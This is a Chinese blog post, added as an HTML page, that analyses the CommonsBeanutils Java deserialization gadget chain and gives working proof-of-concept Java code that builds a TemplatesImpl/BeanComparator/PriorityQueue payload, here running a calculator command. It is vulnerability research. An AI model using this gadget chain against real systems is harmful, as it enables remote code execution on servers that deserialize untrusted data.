@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"x-f1v3.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CommonsBeanutils 反序列化分析">
+<meta name="keywords" content="Java,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsBeanutils 反序列化">
+<meta property="og:url" content="http://x-f1v3.github.io/blog/1620289251280.html">
+<meta property="og:site_name" content="F1v3&#39;s Notes">
+<meta property="og:description" content="CommonsBeanutils 反序列化分析">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289288240.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289299111.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289321770.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289345167.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289356639.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289365962.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1620289379545.png">
+<meta property="og:updated_time" content="2021-05-06T08:25:33.954Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CommonsBeanutils 反序列化">
+<meta name="twitter:description" content="CommonsBeanutils 反序列化分析">
+<meta name="twitter:image" content="http://x-f1v3.github.io/images/1620289288240.png">
+
+<link rel="canonical" href="http://x-f1v3.github.io/blog/1620289251280.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>CommonsBeanutils 反序列化 | F1v3's Notes</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">F1v3's Notes</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://x-f1v3.github.io/blog/1620289251280.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="F1v3">
+      <meta itemprop="description" content="F1v3's Notes">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="F1v3's Notes">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CommonsBeanutils 反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-06 16:20:51 / Modified: 16:25:33" itemprop="dateCreated datePublished" datetime="2021-05-06T16:20:51+08:00">2021-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CommonsBeanutils 反序列化分析<br><a id="more"></a></p>
+<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils:1.9.2</span><br><span class="line">commons-collections:3.1</span><br><span class="line">commons-logging:1.2</span><br></pre></td></tr></table></figure>
+<h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">		PriorityQueue.siftDown()</span><br><span class="line">			siftDownUsingComparator()</span><br><span class="line">				BeanComparator.compare()</span><br><span class="line">					TemplatesImpl.getOutputProperties()</span><br><span class="line">						TemplatesImpl.newTransformer()</span><br><span class="line">							TemplatesImpl.getTransletInstance()</span><br><span class="line">								TemplatesImpl.defineTransletClasses()</span><br><span class="line">						TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">										Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">											Runtime.exec()</span><br></pre></td></tr></table></figure>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>利用链的前半部分还是一样，通过队列中的元素比较，调用某个类的 <code>compare</code> 方法，这次的换成了 <code>org.apache.commons.beanutils.BeanComparator</code> 类：<br><img src="http://x-f1v3.github.io/images/1620289288240.png" alt="image"></p>
+<p>可以看到如果 <code>this.property</code> 不为空， 则执行 <code>PropertyUtils.getProperty(o1, this.property);</code>，而 <code>this.property</code>  是通过 <code>BeanComparator</code> 的构造函数传入的，在看 <code>PropertyUtils.getProperty</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289299111.png" alt="image"></p>
+<p>这里跳过了很多步骤，简而言之，该方法就是调用传入对象的传入 <code>getter</code> 方法，按照这里的利用链是 <code>TemplatesImpl</code> 的 <code>getOutputProperties</code> 方法，当然，这2个参数都是能控制的，接下来跟进 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289321770.png" alt="image"></p>
+<p>这里就执行了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289345167.png" alt="image"></p>
+<p>接下来就是 <code>getTransletInstance</code> 方法：<br><img src="http://x-f1v3.github.io/images/1620289356639.png" alt="image"></p>
+<p>根据字节码重建自定义类：<br><img src="http://x-f1v3.github.io/images/1620289365962.png" alt="image"></p>
+<p>这里的流程和 <code>Commonscollections2</code> 反序列化一致，加载自定义类实现任意代码执行；</p>
+<p>反序列化的原理已经清楚了，现在就要根据原理构造 POC 了。</p>
+<p>首先还是创建一个自定义类，带有 EXP 并继承 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，为啥要继承在 <code>Commonscollections2</code> 里由提到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.exp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutilsEXP</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommonsBeanutilsEXP</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后用 <code>javassist</code> 将恶意类通过反射的方法插入到 <code>TemplatesImpl</code> 的 <code>_bytecodes</code> 的变量中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Boolean.parseBoolean(System.getProperty(<span class="string">"properXalan"</span>, <span class="string">"false"</span>)) ? createTemplatesImpl( Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span><span class="params">(Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    T templates = tplClass.newInstance();</span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    setFieldValue(templates, <span class="string">"_bytecodes"</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">            ClassPool.getDefault().get(CommonsBeanutilsEXP.class.getName()).toBytecode()</span><br><span class="line">    &#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后实例化 <code>org.apache.commons.beanutils.BeanComparator</code> 并作为 <code>PriorityQueue</code> 的比较器，然后通过反射的方式将构造的 <code>TemplatesImpl</code> 放入 <code>PriorityQueue</code> 的参数即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Object templates = createTemplatesImpl();</span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">    <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">    setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">    tools.Deserialize(queue);</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1620289379545.png" alt="image"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+              <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blog/1618536577650.html" rel="prev" title="某mobile RCE分析">
+      <i class="fa fa-chevron-left"></i> 某mobile RCE分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#依赖环境"><span class="nav-number">1.</span> <span class="nav-text">依赖环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发流程"><span class="nav-number">2.</span> <span class="nav-text">触发流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-number">3.</span> <span class="nav-text">Payload</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">F1v3</p>
+  <div class="site-description" itemprop="description">F1v3's Notes</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">F1v3</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">65k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">59 mins.</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
